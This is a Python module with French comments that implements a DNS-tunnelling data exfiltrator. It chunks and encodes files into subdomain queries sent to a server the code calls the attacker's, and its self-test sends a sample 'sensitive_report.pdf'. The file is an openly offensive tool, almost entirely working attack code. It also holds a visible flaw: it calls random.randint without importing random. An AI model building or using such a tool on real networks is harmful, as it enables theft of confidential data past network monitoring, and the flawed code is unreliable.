import dns.resolver
import dns.rdata
import dns.rdataclass
import dns.rdatatype
import base64
import binascii # Pour l'encodage hex
import time
import math

class DNSExfiltrator:
    """
    Gère l'exfiltration de données via des requêtes DNS (tunneling DNS).
    Les données sont encodées en Base32 ou hexadécimal et envoyées en sous-domaines.
    """

    # Limite générale pour un label DNS est 63 caractères.
    # Pour être sûr, on garde une marge.
    # Base32: chaque 5 bytes de données binaires deviennent 8 caractères Base32.
    # Donc 63 chars Base32 = (63/8)*5 = 39.375 bytes de données. On peut prendre 35-38 bytes réels.
    # Hex: chaque byte devient 2 caractères hex. 63 chars hex = 31.5 bytes de données. On peut prendre 30 bytes réels.
    MAX_LABEL_LENGTH = 60 # Longueur maximale d'un sous-domaine pour les données (63 max)
    
    def __init__(self, dns_server: str, dns_domain: str, logger=None):
        """
        Initialise l'exfiltrateur DNS.

        :param dns_server: L'adresse IP du serveur DNS à interroger (serveur de l'attaquant).
        :param dns_domain: Le domaine d'exfiltration (ex: "exfil.yourdomain.com").
        :param logger: Instance du logger pour la journalisation.
        """
        self.dns_server = dns_server
        self.dns_domain = dns_domain
        self.logger = logger

        # Configurer le résolveur pour utiliser le serveur DNS spécifié
        self.resolver = dns.resolver.Resolver(configure=False)
        self.resolver.nameservers = [self.dns_server]
        # Optionnel: ajuster le timeout si le serveur DNS est lent ou lointain
        self.resolver.timeout = 5
        self.resolver.lifetime = 5

        if self.logger:
            self.logger.log_debug(f"[DNSExfiltrator] Initialisé. Serveur DNS: {self.dns_server}, Domaine: {self.dns_domain}")

    def _log(self, level, message):
        """Helper pour logguer si un logger est disponible."""
        if self.logger:
            getattr(self.logger, f"log_{level}")(f"[DNSExfiltrator] {message}")
        else:
            print(f"[{level.upper()}] [DNSExfiltrator] {message}")

    def _encode_data(self, data: bytes, encoding: str) -> str:
        """Encode les données binaires en Base32 ou hexadécimal."""
        if encoding == "base32":
            # Base32 ajoute padding '=', qu'il faut enlever pour les noms de domaine
            return base64.b32encode(data).decode('utf-8').replace('=', '')
        elif encoding == "hex":
            return binascii.hexlify(data).decode('utf-8')
        else:
            raise ValueError("Encodage DNS non supporté. Utilisez 'base32' ou 'hex'.")

    def _decode_data(self, encoded_data: str, encoding: str) -> bytes:
        """Décode les données de Base32 ou hexadécimal en binaire."""
        if encoding == "base32":
            # Base32 nécessite un padding pour être décodé (multiple de 8 caractères)
            # ou Cryptodome peut le gérer directement, mais b32decode de base64 non.
            # On ajoute le padding si manquant
            padding = (8 - (len(encoded_data) % 8)) % 8
            encoded_data += '=' * padding
            return base64.b32decode(encoded_data.encode('utf-8'))
        elif encoding == "hex":
            return binascii.unhexlify(encoded_data.encode('utf-8'))
        else:
            raise ValueError("Encodage DNS non supporté. Utilisez 'base32' ou 'hex'.")

    def exfiltrate(self, data: bytes, filename: str, encoding: str = "base32") -> bool:
        """
        Exfiltre les données en les divisant en chunks et en les envoyant via des requêtes DNS.

        :param data: Les données binaires à exfiltrer (doivent déjà être chiffrées et compressées).
        :param filename: Le nom original du fichier (pour l'identifier côté serveur).
        :param encoding: La méthode d'encodage des données ('base32' ou 'hex').
        :return: True si l'exfiltration a réussi, False sinon.
        """
        if not data:
            self._log("warning", "Aucune donnée à exfiltrer via DNS.")
            return True # Considérer comme réussi si rien à exfiltrer

        encoded_data = self._encode_data(data, encoding)
        
        # Le nom de fichier doit aussi être encodé pour être compatible DNS
        encoded_filename = self._encode_data(filename.encode('utf-8'), encoding)

        # Calculer la taille maximale des données par chunk
        # Chaque caractère hex/base32 représente des bits
        # Un label DNS peut avoir jusqu'à 63 caractères.
        # Nous allons réserver quelques caractères pour l'index et le filename.
        # Format du sous-domaine: <index>-<total_chunks>-<filename_chunk>-<data_chunk>.<domaine_exfiltration>
        # Longueur totale = len(<index>) + 1 + len(<total_chunks>) + 1 + len(<filename_chunk>) + 1 + len(<data_chunk>)
        # Nous devons être plus intelligents avec la segmentation pour s'assurer que
        # le sous-domaine total ne dépasse pas 255 caractères et chaque label 63.

        # Simplification: un ID de transaction unique pour le fichier et l'index de chunk
        transaction_id = str(random.randint(10000, 99999)) # ID unique pour cette exfiltration de fichier

        # Le 'filename' et le 'transaction_id' seront envoyés une seule fois au début
        # ou inclus dans chaque chunk pour la robustesse. Pour la robustesse, on les inclut.
        
        # On doit s'assurer que le nom de domaine complet ne dépasse pas 255 caractères
        # et que chaque label ne dépasse pas 63 caractères.
        # <ID>.<INDEX>.<TOTAL>.<FILENAME_CHUNK>.<DATA_CHUNK>.<DNS_DOMAIN>
        
        # On va préfixer chaque chunk avec l'ID de transaction et l'index du chunk.
        # Ex: "TID-001-C001-DATA..."
        # Pour rester dans la limite de 63 caractères par label, il faut réduire le chunk de données.

        # Taille réelle disponible pour le 'data_chunk' dans un label de 60 caractères
        # On met ID_TRANS-INDEX_CHUNK-DATA
        # Ex: "12345-001-" -> 10 caractères. Reste 50 caractères pour les données.
        # En Base32: 50 chars Base32 = (50/8)*5 = 31.25 bytes. Donc 30 bytes de données.
        # En Hex: 50 chars Hex = 25 bytes de données.
        
        bytes_per_chunk = 30 if encoding == "base32" else 25 # Combien de bytes de DATA réels par chunk

        num_chunks = math.ceil(len(data) / bytes_per_chunk)
        self._log("info", f"Exfiltration DNS de '{filename}': {len(data)} bytes -> {num_chunks} chunks.")

        # Envoyer un premier "header" DNS pour le filename et l'ID de transaction
        # Format: <transaction_id>-<total_chunks>-<encoded_filename>.header.<dns_domain>
        header_subdomain = f"{transaction_id}-{num_chunks}-{encoded_filename}.header.{self.dns_domain}"
        if len(header_subdomain) > 255 or any(len(label) > 63 for label in header_subdomain.split('.')):
            self._log("error", f"Nom de domaine d'en-tête trop long ou labels trop longs: {header_subdomain}")
            self._log("error", "L'encodage du nom de fichier est trop long pour le tunneling DNS.")
            return False

        self._log("debug", f"Envoi du chunk d'en-tête: {header_subdomain}")
        try:
            self.resolver.query(header_subdomain, 'A') # Requête A, peu importe la réponse
            time.sleep(0.1) # Petite pause pour ne pas surcharger le serveur DNS
        except dns.resolver.NXDOMAIN:
            self._log("debug", f"Header DNS: NXDOMAIN (attendu si le serveur ne répond pas avec une IP).")
        except dns.resolver.Timeout:
            self._log("warning", f"Timeout lors de l'envoi du chunk d'en-tête DNS: {header_subdomain}")
        except Exception as e:
            self._log("error", f"Erreur inattendue lors de l'envoi du chunk d'en-tête DNS: {e}")
            return False

        # Envoyer les chunks de données
        success_count = 0
        for i in range(num_chunks):
            start = i * bytes_per_chunk
            end = min((i + 1) * bytes_per_chunk, len(data))
            chunk_data_bytes = data[start:end]
            encoded_chunk = self._encode_data(chunk_data_bytes, encoding)

            # Format du sous-domaine pour les données: <ID>-<chunk_index>-<encoded_data_chunk>.<dns_domain>
            # L'index est formaté avec des zéros pour maintenir la longueur (ex: 001, 010, 100)
            chunk_subdomain = f"{transaction_id}-{str(i).zfill(math.ceil(math.log10(num_chunks + 1)))}-{encoded_chunk}.{self.dns_domain}"
            
            # Vérifier la longueur du sous-domaine complet et de chaque label
            if len(chunk_subdomain) > 255 or any(len(label) > 63 for label in chunk_subdomain.split('.')):
                self._log("error", f"Nom de domaine de chunk trop long ou labels trop longs: {chunk_subdomain}")
                self._log("error", "Réduire la taille des données ou l'encodage.")
                return False # Échec si un chunk est trop long

            self._log("debug", f"Envoi du chunk {i+1}/{num_chunks}: {chunk_subdomain}")
            try:
                # Type de requête 'A' (adresse IPv4) est le plus courant pour le tunneling
                self.resolver.query(chunk_subdomain, 'A')
                success_count += 1
                time.sleep(0.1) # Petite pause entre les requêtes pour ne pas générer trop de trafic
            except dns.resolver.NXDOMAIN:
                # NXDOMAIN est souvent la réponse attendue si le serveur DNS ne résout pas le domaine d'exfiltration
                # mais agit comme un récepteur. Ce n'est pas un échec de transmission.
                self._log("debug", f"Chunk {i+1} DNS: NXDOMAIN (attendu).")
                success_count += 1 # On considère que le chunk a été reçu si NXDOMAIN est renvoyé
            except dns.resolver.Timeout:
                self._log("warning", f"Timeout lors de l'envoi du chunk {i+1} DNS. Réessai potentiel nécessaire.")
                # Ne pas incrémenter success_count si timeout, car le chunk n'a peut-être pas été reçu
                pass 
            except Exception as e:
                self._log("error", f"Erreur inattendue lors de l'exfiltration DNS du chunk {i+1}: {e}")
                pass # Ne pas incrémenter success_count

        if success_count == num_chunks:
            self._log("info", f"Exfiltration DNS de '{filename}' réussie pour tous les {num_chunks} chunks.")
            return True
        else:
            self._log("error", f"Exfiltration DNS de '{filename}' échouée. {success_count}/{num_chunks} chunks envoyés avec succès.")
            return False

# --- Partie de test (à exécuter si le fichier est lancé directement) ---
if __name__ == "__main__":
    print("[+] Test du module DNSExfiltrator...")

    # Pour un test réel, vous auriez besoin d'un serveur DNS faisant autorité
    # pour un sous-domaine que vous contrôlez, et configuré pour logguer les requêtes.
    # Ex: Attacker's DNS server: 192.168.1.100
    # Ex: Exfiltration domain: exfil.yourdomain.com

    # !!! ATTENTION: CES VALEURS SONT DES EXEMPLES ET NE FONCTIONNERONT PAS SANS UN SERVEUR DNS RÉELlement configuré !!!
    # Utilisez un serveur DNS de test qui va forwarder ou qui est configuré pour logguer.
    # Pour un test de base, vous pouvez utiliser 8.8.8.8, mais vous ne verrez pas les requêtes
    # car Google ne logguera pas vos sous-domaines malicieux.
    # Un "serveur" DNS local sur votre machine avec  ou  configuré pour
    # capturer les requêtes vers un domaine spécifique serait l'idéal pour le développement.
    
    TEST_DNS_SERVER = "8.8.8.8" # Un vrai serveur DNS public (pour voir si la requête part)
                                # mais qui NE LOGGUERA PAS vos sous-domaines.
                                # Pour un test réel, utilisez l'IP d'un serveur DNS que vous contrôlez.
    TEST_DNS_DOMAIN = "example.com" # Un domaine générique. Remplacez par le vôtre.

    print(f"\n[!] Pour un test réel, vous devez configurer un serveur DNS que vous contrôlez "
          f"et un domaine comme '{TEST_DNS_DOMAIN}' pour qu'il soit résolu par ce serveur.")
    print(f"[!] L'agent enverra des requêtes vers '{TEST_DNS_SERVER}'.")
    print(f"[!] Les sous-domaines exfiltrés ressembleront à: <data_chunk>.{TEST_DNS_DOMAIN}")

    exfiltrator = DNSExfiltrator(TEST_DNS_SERVER, TEST_DNS_DOMAIN)

    # Données de test (simulons des données chiffrées et compressées)
    test_data = b"This is some very important and highly confidential data to exfiltrate using DNS tunneling. This data needs to be broken into small chunks. The quick brown fox jumps over the lazy dog. Repetition is good for testing compression ratios and chunking mechanisms." * 5
    test_filename = "sensitive_report.pdf"

    # Test avec Base32
    print(f"\n--- Test Exfiltration DNS avec Base32 ({len(test_data)} bytes) ---")
    success_b32 = exfiltrator.exfiltrate(test_data, test_filename, "base32")
    if success_b32:
        print("[+] Exfiltration DNS (Base32) rapportée comme réussie.")
    else:
        print("[-] Exfiltration DNS (Base32) rapportée comme échouée.")

    # Test avec Hex (moins efficace en compression, plus verbeux)
    print(f"\n--- Test Exfiltration DNS avec Hex ({len(test_data)} bytes) ---")
    success_hex = exfiltrator.exfiltrate(test_data, test_filename, "hex")
    if success_hex:
        print("[+] Exfiltration DNS (Hex) rapportée comme réussie.")
    else:
        print("[-] Exfiltration DNS (Hex) rapportée comme échouée.")

    print("\n[+] Tests du module DNSExfiltrator terminés.")
    print("[!] Rappel: Un test 'réussi' ici signifie que les requêtes ont été envoyées, "
          "pas nécessairement qu'elles ont été reçues et traitées par votre serveur de contrôle.")

